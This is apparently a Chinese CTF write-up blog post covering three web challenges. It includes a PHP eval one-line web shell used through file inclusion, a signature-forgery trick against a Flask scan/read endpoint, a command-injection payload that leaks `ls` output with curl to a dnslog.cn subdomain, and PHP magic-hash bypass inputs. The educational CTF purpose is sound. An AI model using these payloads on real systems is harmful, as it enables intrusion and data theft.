---
layout:    post
title:     第一周
subtitle:  学习学习
date:      2021-08-01
author:    lll-yz
header-img: img/post-bg-coffee.jpg
catalog:    true
tags:
    - CTF
---

### web02

上传一个一句话``<?php @eval($_POST['hhh']);?>``

给出上传文件路径，不能直接访问，但是我们可以发现在刚开始是文件包含读取的文件，所以还是以包含读取我们的上传路径，可以访问到，然后直接在hackbar上，执行命令：

```
hhh=system('cat f*');
```

### web03

```
#! /usr/bin/env python
#encoding=utf-8
from flask import Flask
from flask import request
import socket
import hashlib
import urllib
import sys
import os
import json
reload(sys)
sys.setdefaultencoding('latin1')

app = Flask(__name__)

secert_key = os.urandom(16)


class Task:
    def __init__(self, action, param, sign, ip):
        self.action = action
        self.param = param
        self.sign = sign
        self.sandbox = md5(ip)
        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr
            os.mkdir(self.sandbox)

    def Exec(self):
        result = {}
        result['code'] = 500
        if (self.checkSign()):
            if "scan" in self.action:
                tmpfile = open("./%s/result.txt" % self.sandbox, 'w')
                resp = scan(self.param)
                if (resp == "Connection Timeout"):
                    result['data'] = resp
                else:
                    print resp
                    tmpfile.write(resp)
                    tmpfile.close()
                result['code'] = 200
            if "read" in self.action:
                f = open("./%s/result.txt" % self.sandbox, 'r')
                result['code'] = 200
                result['data'] = f.read()
            if result['code'] == 500:
                result['data'] = "Action Error"
        else:
            result['code'] = 500
            result['msg'] = "Sign Error"
        return result

    def checkSign(self):
        if (getSign(self.action, self.param) == self.sign):
            return True
        else:
            return False


#generate Sign For Action Scan.
@app.route("/geneSign", methods=['GET', 'POST'])
def geneSign():
    param = urllib.unquote(request.args.get("param", ""))
    action = "scan"
    return getSign(action, param)


@app.route('/De1ta',methods=['GET','POST'])
def challenge():
    action = urllib.unquote(request.cookies.get("action"))
    param = urllib.unquote(request.args.get("param", ""))
    sign = urllib.unquote(request.cookies.get("sign"))
    ip = request.remote_addr
    if(waf(param)):
        return "No Hacker!!!!"
    task = Task(action, param, sign, ip)
    return json.dumps(task.Exec())
@app.route('/')
def index():
    return open("code.txt","r").read()


def scan(param):
    socket.setdefaulttimeout(1)
    try:
        return urllib.urlopen(param).read()[:50]
    except:
        return "Connection Timeout"



def getSign(action, param):
    return hashlib.md5(secert_key + param + action).hexdigest()


def md5(content):
    return hashlib.md5(content).hexdigest()


def waf(param):
    check=param.strip().lower()
    if check.startswith("gopher") or check.startswith("file"):
        return True
    else:
        return False


if __name__ == '__main__':
    app.debug = False
    app.run(host='0.0.0.0',port=80)
```

可以看到在/De1ta页面我们可以get传入param值，在cookie里可以传入action和sign的值。而param会经过waf的检查：

```
def waf(param):
    check=param.strip().lower()
    if check.startswith("gopher") or check.startswith("file"):
        return True
    else:
        return False
```

waf函数过滤了gopher和file两个协议。

然后在challenge里，对我们传入的参数构造了一个Task类对象，并且执行它的Exec方法：

```
def Exec(self):
        result = {}
        result['code'] = 500
        if (self.checkSign()):
            if "scan" in self.action:
                tmpfile = open("./%s/result.txt" % self.sandbox, 'w')
                resp = scan(self.param)
                if (resp == "Connection Timeout"):
                    result['data'] = resp
                else:
                    print resp
                    tmpfile.write(resp)
                    tmpfile.close()
                result['code'] = 200
            if "read" in self.action:
                f = open("./%s/result.txt" % self.sandbox, 'r')
                result['code'] = 200
                result['data'] = f.read()
            if result['code'] == 500:
                result['data'] = "Action Error"
        else:
            result['code'] = 500
            result['msg'] = "Sign Error"
        return result

```

先通过checkSign方法检测登录，需要传入参数action和param经过getSign这个函数之后与sign相等，然后如果scan在action里，则可以让param进入scan这个函数，而这里的判断用的是in，而不是==。然后去看scan函数，这里可以发现传入到scan里的param并没有被过滤，所以如果我们能够令param伪flag.txt则可以读取它的内容。

由此我们开始构造，首先需要self.checkSign()返回真，所以我们需要让经过getSign函数的action和param返回值等于sign。也就是：

```
hashlib.md5(secert_key + param + action).hexdigest() == self.sign

hashlib.md5(secert_key + 'flag.txt' + 'readscan').hexdigest() == self.sign
```

即我们需要得到secert_key + 'flag.txtreadscan'的哈希值，

```

@app.route("/geneSign", methods=['GET', 'POST'])
def geneSign():
    param = urllib.unquote(request.args.get("param", ""))
    action = "scan"
    return getSign(action, param)
```

但是我们不知道secret_key的值，但是我们可以通过上面截取的源码中/geneSign，来返回我们所需要的编码之后的哈希值。

因为/geneSign中已经将action定为scan，所以我们传入的param可以为flag.txtread，使它还是拼接为``secert_key + 'flag.txtreadscan'``。

即先：

```
/geneSign?param=flag.txtread
```

得到返回的哈希值。

再访问De1ta页面，传递参数：

```
Cookie: action=readscan;sign=哈希值
```

### web08

```
?F=`$F`;+curl `ls`.v3lcwh.dnslog.cn
```

得到

[![fJJR0J.png](https://z3.ax1x.com/2021/08/10/fJJR0J.png)](https://imgtu.com/i/fJJR0J)

然后访问yesYes.php,提示碰碰运气? 然后想到了robots.txt，去访问，得到Yahoo.php提示，去访问：

```php
 <?php

error_reporting(0);
highlight_file(__FILE__);

include("yesYes.php");

$a=$_GET['A_b.c.d_D'];
$b=$_POST['B_c_d.e.E'];

if(isset($_GET['A_b.c.d_D'])&&isset($_POST['B_c_d.e.E']))
{
    if(!preg_match("/.+?aa/i",$a))
    {
        if(sha1($a)==md5($b))
        {
            echo $flag;
        }

    }
    else
    {
        die("aa is Bad");
    }

}
else
{
    die("Put Where??");
}
?> 
```

首先还是先绕过两个GET，POST传参：``A[b.c.d_D``和``B[c_d.e.E``，然后就是绕过正则和sha1()和md5()，因为是弱比较，所以我们可以让他们加密后变为0E开头来绕过，就和两个 md5() 弱比较同理。

构造：GET：``?A[b.c.d_D=aa3OFF9m``，POST：``B[c_d.e.E=240610708``即可。